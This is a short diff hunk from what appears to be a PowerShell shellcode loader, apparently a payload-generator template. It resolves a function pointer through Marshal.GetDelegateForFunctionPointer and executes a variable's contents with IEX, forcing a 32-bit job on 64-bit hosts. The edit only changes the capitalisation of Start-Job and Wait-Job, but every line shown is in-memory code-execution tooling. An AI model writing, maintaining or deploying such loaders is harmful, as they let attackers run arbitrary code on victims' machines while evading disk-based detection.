@@ -30,7 +30,7 @@ $var10 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 '@
 
 If ([IntPtr]::size -eq 8) {
-        start-job { param($var11) IEX $var11 } -RunAs32 -Argument $var1 | wait-job | Receive-Job
+        Start-Job { param($var11) IEX $var11 } -RunAs32 -Argument $var1 | Wait-Job | Receive-Job
 }
 else {
         IEX $var1
